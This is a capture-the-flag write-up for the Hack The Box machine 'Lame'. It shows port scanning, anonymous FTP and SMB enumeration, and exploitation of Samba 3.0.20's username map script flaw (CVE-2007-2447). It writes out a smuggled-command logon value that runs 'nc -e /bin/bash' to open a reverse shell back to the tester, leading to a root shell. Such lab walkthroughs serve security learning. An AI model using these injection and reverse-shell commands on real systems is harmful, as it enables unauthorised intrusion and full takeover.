# Lame
**Machine ip:** 10.10.10.3

## Enumeration
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.3 -e tun0 > ports`
```
└─$ sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.3 -e tun0 > ports
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2024-01-02 13:58:37 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a34eabd7-9f22-4c5d-a498-106bac766611)

+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
```
└─$ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

```

+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.3`
```
└─$ sudo nmap -Pn -sV -sC -p$ports 10.10.10.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-02 09:01 EST
Nmap scan report for 10.10.10.3
Host is up (0.066s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.18
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OS: Unix

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h30m23s, deviation: 3h32m12s, median: 20s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-01-02T09:02:23-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.07 seconds
```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1d356312-dcb1-4989-b3b3-e10cab5fc63a)

## Findings
### port 21 - ftp:
+ Anonymous ftp login: `ftp 10.10.10.3`
```
└─$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||7586|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -a
229 Entering Extended Passive Mode (|||7249|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> exit
221 Goodbye.
```
There is nothing interesting!
<br>
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a2882d78-2172-4430-87ec-a1d1e58c2c0d)

### port 445 - smb:
Check null sessions.
+ `smbmap -H 10.10.10.3`
```
└─$ smbmap -H 10.10.10.3
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.3:445	Name: 10.10.10.3          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2afe74b5-ee2e-4d78-8caf-39fae6076adb)

+ `smbclient //10.10.10.3/tmp -N`
```
└─$ smbclient //10.10.10.3/tmp -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jan  2 09:22:20 2024
  ..                                 DR        0  Sat Oct 31 03:33:58 2020
  5587.jsvc_up                        R        0  Tue Jan  2 08:00:52 2024
  .ICE-unix                          DH        0  Tue Jan  2 07:59:44 2024
  vmware-root                        DR        0  Tue Jan  2 07:59:50 2024
  .X11-unix                          DH        0  Tue Jan  2 08:00:15 2024
  .X0-lock                           HR       11  Tue Jan  2 08:00:15 2024
  vgauthsvclog.txt.0                  R     1600  Tue Jan  2 07:59:42 2024

		7282168 blocks of size 1024. 5386520 blocks available
smb: \> exit

```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f4d634cd-8ec5-4d52-8901-2f0c06f5119f)
<br>
There is nothing interesting!

## Exploits
### vsftpd 2.3.4
+ vsftpd exploits fail. Try other service.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dbaf9db6-b70c-4052-b950-4b2f8f81b28b)


### samba 3.0.20
+ `searchsploit samba 3.0.20`
```
└─$ searchsploit samba 3.0
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)              | osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                            | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)  | unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)            | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)          | solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                          | linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                 | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                  | linux/remote/364.pl
Samba < 3.0.20 - Remote Heap Overflow                                             | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                     | linux_x86/dos/36741.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/aec3ce24-da30-4450-a730-d0bd6f04e125)

+ `Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)  | unix/remote/16320.rb`
<br>

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/25853d56-2c6b-46be-b6e4-1b3e98b2b17f)

+ Pull the exploit: `searchsploit -m unix/remote/16320.rb`
```
└─$ searchsploit -m unix/remote/16320.rb
  Exploit: Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/16320
     Path: /usr/share/exploitdb/exploits/unix/remote/16320.rb
    Codes: CVE-2007-2447, OSVDB-34700
 Verified: True
File Type: Ruby script, ASCII text
Copied to: /home/kali/16320.rb

```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/edcacaab-c3d0-4469-aba4-3c8c9d05bc2d)

+ `cat 16320.rb | grep username`
```
└─$ cat 16320.rb | grep username
			'Name'           => 'Samba "username map script" Command Execution',
				"username map script" configuration option. By specifying a username
				this option is used to map usernames prior to authentication!
		username = "/=`nohup " + payload.encoded + "`"
			simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
                        
```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a6ab3615-2dfe-41ca-b51f-e85a659c61e3)
`<br>
```
username = "/=`nohup " + payload.encoded + "`"
```

+ `smbclient //10.10.10.3/tmp -N` and `nc -lnvp 4444`
```
logon "./=`nohup nc -e /bin/bash 10.10.10.3 4444`"
```
```
└─$ smbclient //10.10.10.3/tmp -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ?
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> logon "./=`nohup nc -e /bin/bash 10.10.10.3 4444`"
Password: 
session setup failed: NT_STATUS_LOGON_FAILURE
smb: \> 

```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3bb48c07-e037-481d-b497-24043512c50c)
<br>
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0b37ab1a-b932-4e98-b239-62c50cf1977c)

+ Change the ip to the tunnel ip address.
```
└─$ smbclient //10.10.10.3/tmp -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ?
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> logon "./=`nohup nc -e /bin/bash 10.10.10.3 4444`"
Password: 
session setup failed: NT_STATUS_LOGON_FAILURE
smb: \> logon "./=`nohup nc -e /bin/bash 10.10.XX.XX 4444`"
Password: 
```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/48192019-6577-4ba7-b80c-3ab5663776fd)

<br>
<br>

+ Got the shell as root: `nc -lnvp 4444`
+ Stable shell: `python -c 'import pty; pty.spawn("/bin/bash")'`

<br>

```
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.3] 57528
id 
uid=0(root) gid=0(root)
whoami
root
uname -a
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
python -c 'import pty; pty.spawn("/bin/bash")'
root@lame:/# cat /home/makis/user.txt
cat /home/makis/user.txt
User-Flag
root@lame:/# cat /root/root.txt
cat /root/root.txt
Root-Flag
root@lame:/# 

```
<br>

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a4f76804-26f4-4da9-b912-64d84dd541fb)

# References & Alternatives:
+ https://vvmlist.github.io/#lame
+ https://0xdf.gitlab.io/2020/04/07/htb-lame.html
+ https://medium.com/@dw3113r/hack-the-box-lame-writeup-without-metasploit-d2ac62ae3468
+ https://u1sp00kies.medium.com/hack-the-box-htb-lame-walkthrough-eac5d94e8ec2
+ https://medium.com/@maideglr5/lame-makine-çözümü-htb-47731bc5705f
+ https://blog.artis3nal.com/writeups/htb-lame-msf/
